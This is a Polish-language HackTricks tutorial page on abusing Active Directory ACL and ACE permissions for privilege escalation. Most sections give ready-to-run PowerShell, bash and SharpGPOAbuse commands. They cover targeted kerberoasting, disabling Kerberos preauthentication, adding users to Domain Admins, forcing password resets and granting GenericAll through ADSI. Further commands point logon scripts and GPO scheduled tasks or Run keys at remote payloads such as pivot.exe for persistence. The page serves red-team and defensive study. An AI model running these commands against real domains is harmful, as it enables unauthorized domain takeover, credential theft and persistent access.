# Nadużywanie ACL/ACE Aktywnego Katalogu

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

**Ta strona to głównie podsumowanie technik z** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Aby uzyskać więcej szczegółów, sprawdź oryginalne artykuły.**

## **Prawa GenericAll dla Użytkownika**

To uprawnienie nadaje atakującemu pełną kontrolę nad kontem docelowego użytkownika. Po potwierdzeniu praw `GenericAll` za pomocą polecenia `Get-ObjectAcl`, atakujący może:

* **Zmienić Hasło Docelowego Użytkownika**: Korzystając z `net user <nazwa_użytkownika> <hasło> /domain`, atakujący może zresetować hasło użytkownika.
* **Kerberoasting Ukierunkowany**: Przypisać SPN do konta użytkownika, aby można było go poddać kerberoastingowi, a następnie użyć narzędzi Rubeus i targetedKerberoast.py do wydobycia i próby złamania skrótu biletu służącego do uzyskiwania biletów (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **Ustalona ASREPRoasting**: Wyłącz wstępną autentykację dla użytkownika, czyniąc jego konto podatnym na atak ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Prawa GenericAll w grupie**

To uprawnienie pozwala atakującemu manipulować członkostwem w grupie, jeśli ma prawa `GenericAll` w grupie takiej jak `Administratorzy domeny`. Po zidentyfikowaniu nazwy wyróżniającej grupy za pomocą `Get-NetGroup`, atakujący może:

* **Dodać siebie do grupy Administratorzy domeny**: Można to zrobić za pomocą poleceń bezpośrednich lub korzystając z modułów takich jak Active Directory lub PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Posiadanie tych uprawnień na obiekcie komputera lub koncie użytkownika umożliwia:

* **Ograniczona delegacja zasobów Kerberos**: Umożliwia przejęcie obiektu komputera.
* **Cienie poświadczeń**: Wykorzystaj tę technikę, aby podszywać się pod obiekt komputera lub użytkownika, wykorzystując uprawnienia do tworzenia cieni poświadczeń.

## **WriteProperty on Group**

Jeśli użytkownik ma prawa `WriteProperty` do wszystkich obiektów dla określonej grupy (np. `Administratorzy domeny`), mogą:

* **Dodać Siebie do Grupy Administratorów Domeny**: Możliwe poprzez połączenie poleceń `net user` i `Add-NetGroupUser`, ta metoda umożliwia eskalację uprawnień w domenie.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Sam (Samoprzynależność) w Grupie**

To uprawnienie umożliwia atakującym dodanie siebie do konkretnych grup, takich jak `Administratorzy domeny`, za pomocą poleceń manipulujących bezpośrednio przynależnością do grupy. Użycie następującej sekwencji poleceń pozwala na dodanie siebie:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Członkostwo w grupie)**

Podobne uprawnienie, które pozwala atakującym bezpośrednio dodać siebie do grup poprzez modyfikację właściwości grup, jeśli mają prawo `WriteProperty` do tych grup. Potwierdzenie i wykonanie tego uprawnienia są wykonywane za pomocą:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Posiadanie `ExtendedRight` na użytkowniku dla `User-Force-Change-Password` umożliwia resetowanie hasła bez znajomości bieżącego hasła. Weryfikacja tego uprawnienia i jego wykorzystanie może być przeprowadzone za pomocą PowerShella lub alternatywnych narzędzi wiersza poleceń, oferując kilka metod resetowania hasła użytkownika, w tym sesje interaktywne i jednolinijkowce dla środowisk nieinteraktywnych. Komendy te obejmują proste wywołania PowerShella oraz korzystanie z `rpcclient` na systemie Linux, co demonstruje wszechstronność wektorów ataku.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner na grupie**

Jeśli atakujący odkryje, że ma prawa `WriteOwner` do grupy, może zmienić właściciela grupy na siebie. Jest to szczególnie istotne, gdy grupą w pytaniu jest `Domain Admins`, ponieważ zmiana właściciela pozwala na szerszą kontrolę nad atrybutami grupy i jej członkostwem. Proces obejmuje zidentyfikowanie poprawnego obiektu za pomocą `Get-ObjectAcl`, a następnie użycie `Set-DomainObjectOwner` do zmiany właściciela, zarówno za pomocą SID, jak i nazwy.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite dla użytkownika**

To uprawnienie pozwala atakującemu modyfikować właściwości użytkowników. Konkretnie, dzięki dostępowi `GenericWrite`, atakujący może zmienić ścieżkę skryptu logowania użytkownika, aby wykonać złośliwy skrypt podczas logowania użytkownika. Można to osiągnąć, używając polecenia `Set-ADObject` do zaktualizowania właściwości `scriptpath` docelowego użytkownika, aby wskazywała na skrypt atakującego.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite w grupie**

Z tym uprawnieniem atakujący mogą manipulować przynależnością do grupy, na przykład dodając siebie lub innych użytkowników do określonych grup. Proces ten polega na tworzeniu obiektu poświadczeń, używaniu go do dodawania lub usuwania użytkowników z grupy oraz weryfikacji zmian przynależności za pomocą poleceń PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Posiadanie obiektu AD i uprawnień `WriteDACL` umożliwia atakującemu przyznanie sobie uprawnień `GenericAll` do obiektu. Jest to osiągane poprzez manipulację ADSI, co pozwala na pełną kontrolę nad obiektem i możliwość modyfikacji jego przynależności do grup. Pomimo tego istnieją ograniczenia podczas próby wykorzystania tych uprawnień za pomocą poleceń `Set-Acl` / `Get-Acl` modułu Active Directory.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikacja w domenie (DCSync)**

Atak DCSync wykorzystuje określone uprawnienia replikacji w domenie do naśladowania kontrolera domeny i synchronizacji danych, w tym poświadczeń użytkowników. Ta potężna technika wymaga uprawnień takich jak `DS-Replication-Get-Changes`, pozwalając atakującym wydobywać wrażliwe informacje z środowiska AD bez bezpośredniego dostępu do kontrolera domeny. [**Dowiedz się więcej o ataku DCSync tutaj.**](../dcsync.md)

## Delegacja GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegacja GPO

Delegowany dostęp do zarządzania obiektami zasad grupy (GPO) może stanowić znaczne ryzyko dla bezpieczeństwa. Na przykład, jeśli użytkownik taki jak `offense\spotless` otrzymał uprawnienia do zarządzania GPO, może posiadać przywileje takie jak **WriteProperty**, **WriteDacl** i **WriteOwner**. Te uprawnienia mogą być wykorzystane w celach złośliwych, jak zidentyfikowano za pomocą PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Wyliczanie Uprawnień GPO

Aby zidentyfikować źle skonfigurowane GPO, można łańcuchować cmdlety PowerSploit. Pozwala to na odkrycie GPO, którymi określony użytkownik ma uprawnienia do zarządzania: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Komputery z Zastosowaną Określoną Zasadą**: Można ustalić, do których komputerów jest stosowana określona GPO, co pomaga zrozumieć zakres potencjalnego wpływu. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Zasady Stosowane do Określonego Komputera**: Aby zobaczyć, jakie zasady są stosowane do konkretnego komputera, można użyć poleceń takich jak `Get-DomainGPO`.

**OU z Zastosowaną Określoną Zasadą**: Identyfikacja jednostek organizacyjnych (OU), na które wpływa określona zasada, może być dokonana za pomocą `Get-DomainOU`.

### Wykorzystanie GPO - New-GPOImmediateTask

Źle skonfigurowane GPO mogą być wykorzystane do wykonania kodu, na przykład poprzez utworzenie natychmiastowego zaplanowanego zadania. Można to zrobić, aby dodać użytkownika do grupy administratorów lokalnych na dotkniętych maszynach, znacząco podnosząc uprawnienia:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Moduł GroupPolicy - Nadużycie GPO

Moduł GroupPolicy, jeśli zainstalowany, umożliwia tworzenie i łączenie nowych GPO oraz ustawianie preferencji, takich jak wartości rejestru, w celu uruchomienia tylnych drzwi na dotkniętych komputerach. Ta metoda wymaga aktualizacji GPO i zalogowania użytkownika do komputera w celu wykonania:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Wykorzystanie GPO

SharpGPOAbuse oferuje metodę wykorzystania istniejących GPO poprzez dodawanie zadań lub modyfikowanie ustawień bez konieczności tworzenia nowych GPO. Narzędzie to wymaga modyfikacji istniejących GPO lub użycia narzędzi RSAT do tworzenia nowych przed zastosowaniem zmian:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Wymuś aktualizację zasad

Aktualizacje GPO zazwyczaj występują co około 90 minut. Aby przyspieszyć ten proces, zwłaszcza po wprowadzeniu zmian, można użyć polecenia `gpupdate /force` na komputerze docelowym, aby wymusić natychmiastową aktualizację zasad. To polecenie zapewnia, że wszelkie modyfikacje GPO zostaną zastosowane bez czekania na kolejny cykl automatycznej aktualizacji.

### Pod maską

Po przejrzeniu Zaplanowanych zadań dla określonego GPO, takiego jak `Misconfigured Policy`, można potwierdzić dodanie zadań takich jak `evilTask`. Te zadania są tworzone za pomocą skryptów lub narzędzi wiersza poleceń, które mają na celu modyfikację zachowania systemu lub eskalację uprawnień.

Struktura zadania, jak pokazano w pliku konfiguracji XML wygenerowanym przez `New-GPOImmediateTask`, przedstawia szczegóły zaplanowanego zadania - w tym polecenie do wykonania i jego wyzwalacze. Ten plik przedstawia, jak zdefiniowane są i zarządzane zaplanowane zadania w GPO, dostarczając metody wykonania dowolnych poleceń lub skryptów w ramach egzekwowania zasad.

### Użytkownicy i grupy

GPO umożliwia również manipulację członkostwem użytkowników i grup na systemach docelowych. Poprzez bezpośrednią edycję plików zasad Użytkowników i Grup, atakujący mogą dodać użytkowników do uprzywilejowanych grup, takich jak lokalna grupa `administratorzy`. Jest to możliwe poprzez delegowanie uprawnień do zarządzania GPO, co pozwala na modyfikację plików zasad w celu dodania nowych użytkowników lub zmiany członkostwa w grupach.

Plik konfiguracji XML dla Użytkowników i Grup przedstawia, w jaki sposób te zmiany są wdrażane. Poprzez dodawanie wpisów do tego pliku, określeni użytkownicy mogą otrzymać podwyższone uprawnienia na dotkniętych systemach. Ta metoda oferuje bezpośrednie podejście do eskalacji uprawnień poprzez manipulację GPO.

Ponadto, dodatkowe metody wykonania kodu lub utrzymania trwałości, takie jak wykorzystanie skryptów logowania/wylogowania, modyfikacja kluczy rejestru dla autostartu, instalowanie oprogramowania za pomocą plików .msi lub edycja konfiguracji usług, również mogą być brane pod uwagę. Te techniki zapewniają różne sposoby utrzymania dostępu i kontrolowania systemów docelowych poprzez nadużycie GPO.

## Referencje

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
